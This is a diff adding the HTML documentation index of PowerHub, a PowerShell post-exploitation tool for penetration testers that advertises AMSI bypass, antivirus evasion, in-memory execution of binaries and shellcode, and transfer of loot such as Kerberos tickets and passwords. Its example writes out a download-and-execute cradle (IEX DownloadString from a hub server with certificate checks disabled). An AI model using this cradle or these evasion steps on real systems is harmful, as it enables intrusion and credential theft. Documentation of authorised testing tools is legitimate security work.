@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Welcome to PowerHub’s documentation! &mdash; PowerHub 2.0.0 documentation</title>
+      <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+        <script src="_static/jquery.js"></script>
+        <script src="_static/underscore.js"></script>
+        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="_static/doctools.js"></script>
+        <script src="_static/sphinx_highlight.js"></script>
+    <script src="_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Installation and Quickstart" href="installation.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="#" class="icon icon-home">
+            PowerHub
+          </a>
+              <div class="version">
+                2.0.0
+              </div>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="installation.html">Installation and Quickstart</a></li>
+<li class="toctree-l1"><a class="reference internal" href="philosophy.html">Motivation &amp; Philosophy</a></li>
+<li class="toctree-l1"><a class="reference internal" href="new.html">New in PowerHub 2.0</a></li>
+<li class="toctree-l1"><a class="reference internal" href="changelog.html">Changelog</a></li>
+<li class="toctree-l1"><a class="reference internal" href="evasion.html">Antivirus Evasion Techniques</a></li>
+<li class="toctree-l1"><a class="reference internal" href="usage.html">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="troubleshooting.html">Troubleshooting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="contrib.html">Contributing</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="#">PowerHub</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="#" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Welcome to PowerHub’s documentation!</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="_sources/index.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="welcome-to-powerhub-s-documentation">
+<h1>Welcome to PowerHub’s documentation!<a class="headerlink" href="#welcome-to-powerhub-s-documentation" title="Permalink to this heading"></a></h1>
+<div class="toctree-wrapper compound">
+</div>
+</section>
+<section id="powerhub">
+<h1>PowerHub<a class="headerlink" href="#powerhub" title="Permalink to this heading"></a></h1>
+<p>PowerHub is a convenient post exploitation tool for PowerShell which aids a
+pentester in transferring data, in particular code which may get flagged by
+endpoint protection. Features:</p>
+<ul class="simple">
+<li><p>Fileless</p></li>
+<li><p>Stateless</p></li>
+<li><p>Cert pinning</p></li>
+<li><p>String “obfuscation” by RC4 encryption</p></li>
+<li><p>Choose your AMSI Bypass</p></li>
+<li><p>Transparent aliases for in-memory execution of C# programs</p></li>
+</ul>
+<p><img alt="PowerHub Webapp" src="_images/powerhub-webapp.png" />
+<img alt="PowerHub Webapp" src="_images/powerhub-sharphound.png" /></p>
+<p>During an engagement where you have a test client available, one of the
+first things you want to do is run SharpHound, Seatbelt, PowerUp,
+Invoke-PrivescCheck or PowerSploit. So you need to download the files,
+mess with endpoint protection, disable the execution policy, etc.
+PowerHub provides an (almost) one-click-solution for this. Oh, and you can
+also run arbitrary binaries (PE and shell code) entirely in-memory using
+PowerSploit’s modules, which is sometimes useful to bypass application
+whitelisting.</p>
+<p>Your loot (Kerberos tickets, passwords, etc.) can be easily transferred back
+either as a file or a text snippet, via the command line or the web
+interface. PowerHub also helps with collaboration in case you’re a small
+team.</p>
+<p>Here is a simple example (grab information about local groups with PowerView
+and transfer it back):</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">avollmer</span><span class="p">&gt;</span> <span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span><span class="p">={</span><span class="nv">$true</span><span class="p">};</span><span class="nv">$Nxois</span><span class="p">=</span><span class="s1">&#39;bZeVBC4vZfakT5SmCcaFam6IRY6UNLnC&#39;</span><span class="p">;</span><span class="nv">$Plukgmio</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">;</span><span class="nb">IEX </span><span class="nv">$Plukgmio</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://192.168.11.2:8443/&#39;</span><span class="p">)</span>
+  <span class="n">_____</span>   <span class="n">_____</span>  <span class="n">_</span>  <span class="n">_</span>  <span class="n">_</span> <span class="n">_______</span>  <span class="n">______</span> <span class="n">_</span>     <span class="n">_</span> <span class="n">_</span>     <span class="n">_</span> <span class="n">______</span>
+ <span class="p">|</span><span class="n">_____</span><span class="p">]</span> <span class="p">|</span>     <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span><span class="n">______</span> <span class="p">|</span><span class="n">_____</span><span class="p">/</span> <span class="p">|</span><span class="n">_____</span><span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> <span class="p">|</span><span class="n">_____</span><span class="p">]</span>
+ <span class="p">|</span>       <span class="p">|</span><span class="n">_____</span><span class="p">|</span> <span class="p">|</span><span class="n">__</span><span class="p">|</span><span class="n">__</span><span class="p">|</span> <span class="p">|</span><span class="n">______</span> <span class="p">|</span>    <span class="p">\</span><span class="n">_</span> <span class="p">|</span>     <span class="p">|</span> <span class="p">|</span><span class="n">_____</span><span class="p">|</span> <span class="p">|</span><span class="n">_____</span><span class="p">]</span>
+<span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span>                       <span class="n">written</span> <span class="n">by</span> <span class="n">Adrian</span> <span class="n">Vollmer</span><span class="p">,</span> <span class="n">2018</span><span class="p">-</span><span class="n">202</span>
+<span class="n">Run</span> <span class="s1">&#39;Help-PowerHub&#39;</span> <span class="k">for</span> <span class="n">help</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">avollmer</span><span class="p">&gt;</span> <span class="nb">Get-HubModule</span> <span class="n">PowerView</span>
+
+<span class="n">Name</span>   <span class="p">:</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">avollmer</span><span class="p">/.</span><span class="n">local</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">powerhub</span><span class="p">/</span><span class="n">modules</span><span class="p">/</span><span class="n">PowerSploit</span><span class="p">/</span><span class="n">Recon</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Type </span>  <span class="p">:</span> <span class="n">ps1</span>
+<span class="n">N</span>      <span class="p">:</span> <span class="n">205</span>
+<span class="n">Loaded</span> <span class="p">:</span> <span class="n">True</span>
+<span class="k">Alias</span>  <span class="p">:</span>
+
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">avollmer</span><span class="p">&gt;</span> <span class="nb">Get-LocalGroup</span> <span class="p">|</span> <span class="n">PushTo-Hub</span> <span class="n">-Name</span> <span class="n">groups</span><span class="p">.</span><span class="n">json</span>
+</pre></div>
+</div>
+</section>
+<section id="documentation">
+<h1>Documentation<a class="headerlink" href="#documentation" title="Permalink to this heading"></a></h1>
+<p>Read the docs <a class="reference external" href="https://adrianvollmer.github.io/PowerHub/">here</a>.</p>
+<ul class="simple">
+<li><p><strong>Installation:</strong> <a class="reference external" href="https://adrianvollmer.github.io/PowerHub/installation.html">https://adrianvollmer.github.io/PowerHub/installation.html</a></p></li>
+<li><p><strong>Usage:</strong> <a class="reference external" href="https://adrianvollmer.github.io/PowerHub/usage.html">https://adrianvollmer.github.io/PowerHub/usage.html</a></p></li>
+<li><p><strong>Contributing:</strong> <a class="reference external" href="https://adrianvollmer.github.io/PowerHub/contrib.html">https://adrianvollmer.github.io/PowerHub/contrib.html</a></p></li>
+<li><p><strong>Changelog:</strong> <a class="reference external" href="https://adrianvollmer.github.io/PowerHub/changelog.html">https://adrianvollmer.github.io/PowerHub/changelog.html</a></p></li>
+</ul>
+</section>
+<section id="credits">
+<h1>Credits<a class="headerlink" href="#credits" title="Permalink to this heading"></a></h1>
+<p>PowerHub is partially based on the awesome work of zc00l, &#64;am0nsec, mar10,
+p3nt4. And of course, it would be nothing without &#64;harmj0y,
+&#64;mattifestation and the many other contributors to
+<a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.</p>
+<p>Thanks!</p>
+</section>
+<section id="author-and-license">
+<h1>Author and License<a class="headerlink" href="#author-and-license" title="Permalink to this heading"></a></h1>
+<p>Adrian Vollmer, 2018-2023. MIT License.</p>
+</section>
+<section id="disclaimer">
+<h1>Disclaimer<a class="headerlink" href="#disclaimer" title="Permalink to this heading"></a></h1>
+<p>Use at your own risk. Do not use without full consent of everyone involved.
+For educational purposes only.</p>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="installation.html" class="btn btn-neutral float-right" title="Installation and Quickstart" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2018-2023, Adrian Vollmer.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  
+
+  <div class="rst-versions" data-toggle="rst-versions" role="note" aria-label="versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      <span class="fa fa-book"> Read the Docs</span>
+      v: 2.0.0
+      <span class="fa fa-caret-down"></span>
+    </span>
+    <div class="rst-other-versions">
+      
+      <dl>
+        <dt>Versions</dt>
+        
+          
+          <dd><a href="/PowerHub/master/">master</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.0/">latest</a></dd>
+          
+        
+      </dl>
+      
+      <hr/>
+    </div>
+  </div>
+<script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>  
+
+  <link rel="stylesheet" type="text/css" href="_static/custom.css">
+
+
+
+</body>
+</html>
